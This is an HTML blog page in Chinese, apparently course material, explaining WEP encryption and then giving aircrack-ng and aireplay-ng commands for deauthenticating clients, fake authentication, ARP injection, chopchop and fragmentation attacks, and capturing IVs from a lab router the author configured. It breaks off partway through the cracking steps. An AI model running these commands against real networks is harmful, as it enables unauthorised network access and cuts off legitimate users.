@@ -1,0 +1,1397 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="Hexo">
+    <meta name="description" content="">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>Hexo</title>
+    <link rel="icon" type="image/png" href="../../../../../../../../favicon.png">
+
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/awesome/css/all.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../css/matery.css">
+    <link rel="stylesheet" type="text/css" href="../../../../../../../../css/my.css">
+
+    <script src="../../../../../../../../libs/jquery/jquery.min.js"></script>
+
+<meta name="generator" content="Hexo 6.3.0">
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+<link rel="alternate" href="atom.xml" title="Hexo" type="application/atom+xml">
+</head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="../../../../../../../../index.html" class="waves-effect waves-light">
+                    
+                    <img src="../../../../../../../../medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Hexo</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../index.html" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="../../../../../../../../friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="../../../../../../../../medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Hexo</div>
+        <div class="logo-desc">
+            
+            Never really desperate, only the lost of the soul.
+            
+        </div>
+    </div>
+
+    
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../index.html" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="../../../../../../../../friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+        <li><div class="divider"></div></li>
+        <li>
+            <a href="https://github.com/blinkfox/hexo-theme-matery" class="waves-effect waves-light" target="_blank">
+                <i class="fab fa-github-square fa-fw"></i>Fork Me
+            </a>
+        </li>
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+            <style>
+    .nav-transparent .github-corner {
+        display: none !important;
+    }
+
+    .github-corner {
+        position: absolute;
+        z-index: 10;
+        top: 0;
+        right: 0;
+        border: 0;
+        transform: scale(1.1);
+    }
+
+    .github-corner svg {
+        color: #0f9d58;
+        fill: #fff;
+        height: 64px;
+        width: 64px;
+    }
+
+    .github-corner:hover .octo-arm {
+        animation: a 0.56s ease-in-out;
+    }
+
+    .github-corner .octo-arm {
+        animation: none;
+    }
+
+    @keyframes a {
+        0%,
+        to {
+            transform: rotate(0);
+        }
+        20%,
+        60% {
+            transform: rotate(-25deg);
+        }
+        40%,
+        80% {
+            transform: rotate(10deg);
+        }
+    }
+</style>
+
+<a href="https://github.com/blinkfox/hexo-theme-matery" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
+   data-tooltip="Fork Me" data-position="left" data-delay="50">
+    <svg viewBox="0 0 250 250" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
+        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
+              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
+              fill="currentColor" class="octo-body"></path>
+    </svg>
+</a>
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('../../../../../../../../medias/featureimages/0.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title"></h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="../../../../../../../../libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2023-07-16
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    4k
+                </div>
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
+                    15 分
+                </div>
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+        <!-- 是否加载使用自带的 prismjs. -->
+        <link rel="stylesheet" href="../../../../../../../../libs/prism/prism.css">
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="aircrack-ng破解WEP加密"><a href="#aircrack-ng破解WEP加密" class="headerlink" title="aircrack-ng破解WEP加密"></a>aircrack-ng破解WEP加密</h1><h2 id="1-WEP介绍"><a href="#1-WEP介绍" class="headerlink" title="1.WEP介绍"></a>1.WEP介绍</h2><p>其实我们平常在使用wifi的时候，往往会用到的加密方式主要有<strong>WEP（pre-RSNA）, WPA(TKIP), WPA2(CCMP-AES)</strong>, 如果有个别对安全要求比较高的也会使用<strong>企业级加密（802.1x）</strong>. 在最新的802.11-2010标准中，有明确的支持新的无线设备应该抛弃WEP和WPA加密方式，而且必须支持WPA2加密方式，但是不得不接受的是，现在我们是有的大多数设备并没有更新的这么快，广泛的WEP和WPA仍然在使用者，而且新开发的设备也应该保持对他们的兼容，所以即使在最新开发的产品中也并没有完全按照802.11-2010的要求，直接放弃对WEP和WPA的支持。</p>
+<p>刚开始了解无线加密，也有必要从WEP加密开始掌握WEP-WPA-WPA2-802.1x等相关知识，一是这些东西至少在当前阶段还用的上，二是后面那些更高级的加密方法其实根本上还是基于WEP加密思想改进而来的。</p>
+<p>其实无线加密主要是对数据在链路层进行加密，如下图，802.11主要是对physical[ˈfɪzɪkl]和Data-link层进行了定义，而数据链路层又分成两个部分，媒介访问控制（MAC）和逻辑链路控制（LLC），无线数据的加密处理就是在MAC和LLC两个阶段中间做的事情，加密的对象就是MSDU。</p>
+<p><img src="images/image-20211111163427229.png" alt="image-20211111163427229"></p>
+<p>所以对于没有MSDP的无线帧是不用加密的，比如管理帧只携带layer [ler] 2的信息，不需要加密；控制帧只有头部和尾部，不需要加密；空帧没有数据域（但有特定的功能），也不需要加密； 总之，需要加密的帧，往往是数据帧。</p>
+<h2 id="2-认证类型"><a href="#2-认证类型" class="headerlink" title="2.认证类型"></a>2.认证类型</h2><p>加密的分类主要包括共享秘钥认证和开放系统认证，<strong>WEP加密是共享秘钥式</strong>，而TKIP、CCMP和802.1x则是开放系统，这两种分类个人觉得主要区别是先完成秘钥认证再进行关联，还是先完成关联再进行秘钥认证。比如，它要求无线客户端发送的authentication [ɔːˌθentɪˈkeɪʃn] 报文中指定加密方式，如果是共享秘钥就会进行秘钥的确认，如果是开放系统，则会留到后面关联成功后进行秘钥的确认。</p>
+<h3 id="1-开放系统认证"><a href="#1-开放系统认证" class="headerlink" title="1.开放系统认证"></a>1.开放系统认证</h3><p>这种认证方式不需要确认STA的任何信息，它只是和AP进行一个招呼式的交互，这个过程中并没有交互身份信息，所以也可以认为是一个空加密。这样做的目的是，双方都认为应该在后面使用更安全的加密方式，在这里只是先打个招呼，STA先进来，我们慢慢坐下核对信息。所以STA发送的第一个Authentication [ɔːˌθentɪˈkeɪʃn] 报文只要表面自己使用的开放系统认证就好了，AP自然会给予successful答复，接着后面顺利完成关联。</p>
+<p><img src="images/image-20211111163604849.png" alt="image-20211111163604849"></p>
+<h3 id="2-共享秘钥认证"><a href="#2-共享秘钥认证" class="headerlink" title="2.共享秘钥认证"></a>2.共享秘钥认证</h3><p>这种认证方式使用WEP认证STA，所以这种认证的前提是STA和AP都有配置静态的WEP秘钥，因此认证的目的就是确认两者使用的秘钥是否一致。共享秘钥认证是通过4个认证帧的交互来完成的，STA首先发送一个Authentication request给AP，然后AP会给STA回复一个挑战<strong>明文</strong>，接着STA使用秘钥对这个明文进行加密并发送给ＡＰ，最后AP对其进行解密，如果能够解密成功并且明文一致则表示认证成功并回复。</p>
+<p><img src="images/image-20211111163651921.png" alt="image-20211111163651921"></p>
+<p>虽然看起来，共享秘钥认证比开放系统认证会更安全，其实实际上并不是这样，因为对于共享秘钥认证，攻击者可以捕获明文内容，也可以捕获加密后的密文，那就很容易被破解，而且秘钥一旦被破解，那么后面交互的所有数据包都能轻易的解密。</p>
+<h2 id="3-加密算法介绍"><a href="#3-加密算法介绍" class="headerlink" title="3.加密算法介绍"></a>3.加密算法介绍</h2><p>根据加密算法的分类，可以分为同步加密算法和异步加密算法：</p>
+<p>同步加密算法：这种算法不管是加密还是解密，都是<strong>使用同一个秘钥</strong>，为了确保数据的安全，就需要对这么秘钥进行保护，但问题是在进行认证的时候必须对这个秘钥进行确认，那么就需要提出一种安全的确认秘钥的方法，这些方法包括WEP, TKIP, and CCMP。</p>
+<p>异步加密算法：这种算法包含了两个秘钥，分别是<strong>公钥和私钥</strong>，公钥用于消息的加密，私钥用于消息的解密，所以即使有好多人知道公钥，没有私钥也破解不了消息。</p>
+<p>流加密和块加密： 流加密以<strong>一个bit为单位</strong>进行处理，块加密以<strong>一个块为单位</strong>进行处理</p>
+<h2 id="4-WEP加密和解密"><a href="#4-WEP加密和解密" class="headerlink" title="4.WEP加密和解密"></a>4.WEP加密和解密</h2><h3 id="1-加密"><a href="#1-加密" class="headerlink" title="1.加密"></a>1.加密</h3><p>WEP是一个Layer 2的加密方法，它使用的是ARC4<strong>流加密</strong>。它有一个数据完整性校验操作，也就是<strong>Integrity Check Value (ICV)<strong>，这个值是通过计算为</strong>加密的数据域（MSDU）</strong>而来的。</p>
+<p>802.11标准定义了两个WEP版本，分别是WEP-40和WEP-104支持64bit和128bit加密，其实<strong>40和104都是从64与128减24</strong>得来的，这**24位叫初始化向量Initialization Vector (IV)**，注意和ICV进行区分。</p>
+<p><img src="images/image-20211111164258351.png" alt="image-20211111164258351"></p>
+<p>40和104则是指静态秘钥的bit长度，也就是说</p>
+<p>WEP-40支持输入10 hex characters or 5 ASCII characters,**10位16进制或5位ASCII字符 **</p>
+<p>WEP-104支持输入26 hex characters or 13 ASCII characters:<strong>26位16进制或13位ASCII 字符</strong></p>
+<p><img src="images/image-20211111164336784.png" alt="image-20211111164336784"></p>
+<p>一般来说，WEP支持4个key，使用时从中选一个进行加密。</p>
+<p>那么WEP加密过程是怎么实现的呢？下面根据流程图来分析一下</p>
+<p><img src="images/image-20211111164636938.png" alt="image-20211111164636938"></p>
+<p>（1） IV是动态生成的24bit随机数，标准没有指定应该怎么生成，而且在数据帧中以明文的方式进行发送，它和key结合生成随机种子（seed），然后运用CR4算法生成秘钥流（keystream）。</p>
+<p>（2）对需要加密的明文进行<strong>CRC-32运算</strong>，生成 ICV（32位），然后将这个 ICV 追加到 plaintext的后面</p>
+<p>（3）将尾部有 ICV的plaintext 与密码流进行<strong>异或运算</strong>，得到加密数据</p>
+<p>（4）将 IV 添加到加密数据的前面，进行传送。</p>
+<p>下面是WEP加密后的一个数据帧MPDU 格式：</p>
+<p><img src="images/image-20211111164847496.png" alt="image-20211111164847496"></p>
+<p>从上图可以看出，在帧体部分包括 <strong>IV + MSDU + ICV</strong>：</p>
+<p>IV一共是4个字节，前3个字节是24bit的初始化向量，后面6bit暂时预留空白没用，最后两个bit用来指定使用哪个key，我们前面有提到过，WEP可以配置4个KEY。</p>
+<p>MSDU和ICV是被加密的，在解密的时候，需要检验ICV是否一致</p>
+<h3 id="2-解密"><a href="#2-解密" class="headerlink" title="2.解密"></a>2.解密</h3><p>和加密相反，解密也需要这几个过程：</p>
+<p><img src="images/image-20211111164823217.png" alt="image-20211111164823217"></p>
+<p>（1）IV和key结合生成随机种子（seed），然后运用ACR4算法生成秘钥流（keystream）</p>
+<p>（2）将keystream和加密数据进行异或，得到 plaintext 和 ICV</p>
+<p>（3）根据解密后得到的 plaintext 再计算一个 ICV 和包中的 ICV进行比较，判断是否相等，这也算是一个可靠性的保证。</p>
+<h2 id="5-Aircrack-ng-常用工具包"><a href="#5-Aircrack-ng-常用工具包" class="headerlink" title="5.Aircrack-ng 常用工具包"></a>5.Aircrack-ng 常用工具包</h2><p>aircrack-ng：破解</p>
+<p>airmon-ng：改变网卡工作模式，将网卡从Managed Mode 改变为 Monitor Mode</p>
+<p>airodump-ng：抓包工具，用于捕获报文</p>
+<p>aireplay-ng：提供各种攻击，为airodump-ng创造更多的报文</p>
+<p>airserv-ng：网卡连接到指定端口 可以用来做无线跳板</p>
+<p>airolib-ng：彩虹表破解创建数据库文件</p>
+<p>airdecap-ng：解包</p>
+<h2 id="6-Aireplay-ng-的-6-种攻击模式详解"><a href="#6-Aireplay-ng-的-6-种攻击模式详解" class="headerlink" title="6.Aireplay-ng 的 6 种攻击模式详解"></a>6.Aireplay-ng 的 6 种攻击模式详解</h2><h3 id="1-冲突模式"><a href="#1-冲突模式" class="headerlink" title="1.冲突模式"></a>1.冲突模式</h3><p>-0 Deautenticate 冲突模式</p>
+<p>使已经连接的合法客户端强制断开与路由端的连接，使其重新连接。在重新连接过程中获得验证数据包，从而产生有效 ARP request。</p>
+<p>如果一个客户端连在路由端上，但是没有人上网以产生有效数据，此时，即使用-3 也无法产生有效 ARP request。所以此时需要用-0 攻击模式配合，-3 攻击才会被立刻激活。</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -0 10 –a &lt;ap mac&gt; -c &lt;my mac&gt; wifi0
+【-0】：冲突攻击模式，后面跟发送次数（设置为 0，则为循环攻击，不停的断开连接，客户端无法正常上网）
+【-a】：设置 ap 的 mac
+【-c】：设置已连接的合法客户端的 mac。
+如果不设置-c，则断开所有和 ap 连接的合法客户端。
+aireplay-ng -3 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0
+注：使用此攻击模式的前提是必须有通过认证的合法的客户端连接到路由器<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="2-伪装客户端连接"><a href="#2-伪装客户端连接" class="headerlink" title="2.伪装客户端连接"></a>2.伪装客户端连接</h3><p>-1 fakeauth count 伪装客户端连接</p>
+<p>这种模式是伪装一个客户端和 AP 进行连接。</p>
+<p>这步是无客户端的研究学习的第一步，因为是无合法连接的客户端，因此需要一个伪装客户端来和路由器相连。为让 AP 接受数据包，必须使自己的网卡和 AP 关联。如果没有关联的话，目标 AP 将忽略所有从你网卡发送的数据包，IVS 数据将不会产生。</p>
+<p>用-1 伪装客户端成功连接以后才能发送注入命令，让路由器接受到注入命令后才可反馈数据从而产生 ARP 包。</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -1 0 –e &lt;ap essid&gt; -a &lt;ap mac&gt; -h &lt;my mac&gt; wifi0
+参数说明：
+【-1】：伪装客户端连接模式，后面跟延时
+【-e】：设置 ap 的 essid
+【-a】：设置 ap 的 mac
+【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="3-交互模式"><a href="#3-交互模式" class="headerlink" title="3.交互模式"></a>3.交互模式</h3><p>-2 Interactive 交互模式</p>
+<p>这种攻击模式是一个抓包和提数据发攻击包，三种集合一起的模式</p>
+<p>1．这种模式主要用于研究学习无客户端，先用-1 建立虚假客户端连接然后直接发包攻击 </p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -2 -p 0841 -c ff:ff:ff:ff:ff:ff -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0
+参数说明：
+【-2】：交互攻击模式
+【-p】：设置控制帧中包含的信息（16 进制），默认采用 0841
+【-c】：设置目标 mac 地址
+【-b】：设置 ap 的 mac 地址
+【-h】：设置伪装客户端的网卡 MAC（即自己网卡 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>2．提取包，发送注入数据包， 发包攻击。</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -2 –r &lt;file&gt; -x 1024 wifi0
+-x 1024 是限定发包速度，避免网卡死机，可以选择 1024<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="4-注入攻击模式"><a href="#4-注入攻击模式" class="headerlink" title="4.注入攻击模式"></a>4.注入攻击模式</h3><p>-3 ARP-request 注入攻击模式</p>
+<p>这种模式是一种抓包后分析重发的过程 这种攻击模式很有效。既可以利用合法客户端，也可以配合-1 利用虚拟连接的伪装客户端。如果有合法客户端那一般需要等几分钟，让合法客户端和 ap 之间通信，少量数据就可产生有效 ARP request 才可利用-3模式注入成功。如果没有任何通信存在，不能得到 ARP request.，则这种攻击就会失败。</p>
+<p>如果合法客户端和ap之间长时间内没有 ARP request，可以尝试同时使用-0 攻击. 如果没有合法客户端，则可以利用-1 建立虚拟连接的伪装客户端，连接过程中获得验证数据包，从而产生有效 ARP request。再通过-3 模式注入。</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -3 -b &lt;ap mac&gt; -h &lt;my mac&gt; -x 512 wifi0
+参数说明：
+【-3】：arp 注入攻击模式
+【-b】：设置 ap 的 mac
+【-h】：设置自己的mac地址
+【-x】：定义每秒发送数据户包的数量，但是最高不超过 1024，建议使用 512（也可不定义）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="5-Chopchop-攻击模式"><a href="#5-Chopchop-攻击模式" class="headerlink" title="5.Chopchop 攻击模式"></a>5.Chopchop 攻击模式</h3><p>-4 Chopchop 攻击模式</p>
+<p>用以获得一个包含密钥数据的 xor 文件 这种模式主要是获得一个可利用包含密钥数据的 xor 文件，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。</p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -4 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0 
+参数说明：
+【-b】：设置需要研究学习的 AP 的 mac
+【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6-碎片包攻击模式"><a href="#6-碎片包攻击模式" class="headerlink" title="6.碎片包攻击模式"></a>6.碎片包攻击模式</h3><p>-5 fragment 碎片包攻击模式</p>
+<p>用以获得 PRGA(包含密钥的后缀为 xor 的文件) 这种模式主要是获得一个可利用 PRGA，这里的 PRGA 并不是 wep key 数据，不能用来解密数据包。而是用它来产生一个新的数据包以便我们可以进行注入。其工作原理就是使目标 AP 重新广播包，当 AP 重广播时，一个新的 IVS 将产生，我们就是利用这个来研究学习 </p>
+<pre class="line-numbers language-none"><code class="language-none">aireplay-ng -5 -b &lt;ap mac&gt; -h &lt;my mac&gt; wifi0
+【-5】：碎片包攻击模式
+【-b】：设置 ap 的 mac
+【-h】：设置虚拟伪装连接的 mac（即自己网卡的 mac）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h2 id="7-WEP-wifi破解步骤"><a href="#7-WEP-wifi破解步骤" class="headerlink" title="7.WEP wifi破解步骤"></a>7.WEP wifi破解步骤</h2><h3 id="1-环境准备"><a href="#1-环境准备" class="headerlink" title="1.环境准备"></a>1.环境准备</h3><h4 id="1-路由器介绍"><a href="#1-路由器介绍" class="headerlink" title="1.路由器介绍"></a>1.路由器介绍</h4><p>课程使用的路由器为：思科企业级内置双天线cvr100无线路由器，支持WEP，WPA，WPS加密方式，一般的家用路由器或者比较新的路由器不支持以上三种模式。</p>
+<h4 id="2-路由器配置"><a href="#2-路由器配置" class="headerlink" title="2.路由器配置"></a>2.路由器配置</h4><p>1.选择无线配置，设置wifi信道为1</p>
+<p><img src="images/image-20211117100857932.png" alt="image-20211117100857932"></p>
+<p>2.选择无线wifi–设置安全模式</p>
+<p><img src="images/image-20211117100542595.png" alt="image-20211117100542595"></p>
+<p>3.安全模式选择wep，输入口令-点击生成密钥，点击显示密钥，点击保存</p>
+<p><img src="images/image-20211117100714891.png" alt="image-20211117100714891"></p>
+<h3 id="2-查看网卡是否连接到kali"><a href="#2-查看网卡是否连接到kali" class="headerlink" title="2.查看网卡是否连接到kali"></a>2.查看网卡是否连接到kali</h3><pre class="line-numbers language-none"><code class="language-none">ip a<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="3-开启Monitor-Mode工作模式"><a href="#3-开启Monitor-Mode工作模式" class="headerlink" title="3.开启Monitor Mode工作模式"></a>3.开启Monitor Mode工作模式</h3><pre class="line-numbers language-none"><code class="language-none">airmon-ng start wlan0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="4-扫描附近的wifi"><a href="#4-扫描附近的wifi" class="headerlink" title="4.扫描附近的wifi"></a>4.扫描附近的wifi</h3><p>确定目标wifi的信道，加密方式，信号强度，mac地址等信息</p>
+<pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="5-对目标所在信道进行抓包"><a href="#5-对目标所在信道进行抓包" class="headerlink" title="5.对目标所在信道进行抓包"></a>5.对目标所在信道进行抓包</h3><pre class="line-numbers language-none"><code class="language-none">airodump-ng wlan0mon -c 1 --ivs -w /root/wifi/bk01/WEP --bssid D8:24:BD:79:18:0B
+-c:信道
+--ivs：初始化向量
+-w:输出抓包文件
+--bssid:指定wifi进行抓包<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h3 id="6-手工创建客户端连接"><a href="#6-手工创建客户端连接" class="headerlink" title="6.手工创建客户端连接"></a>6.手工创建客户端连接</h3><pre class="line-numbers language-none"><code class="language-none">设备连接wifi<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
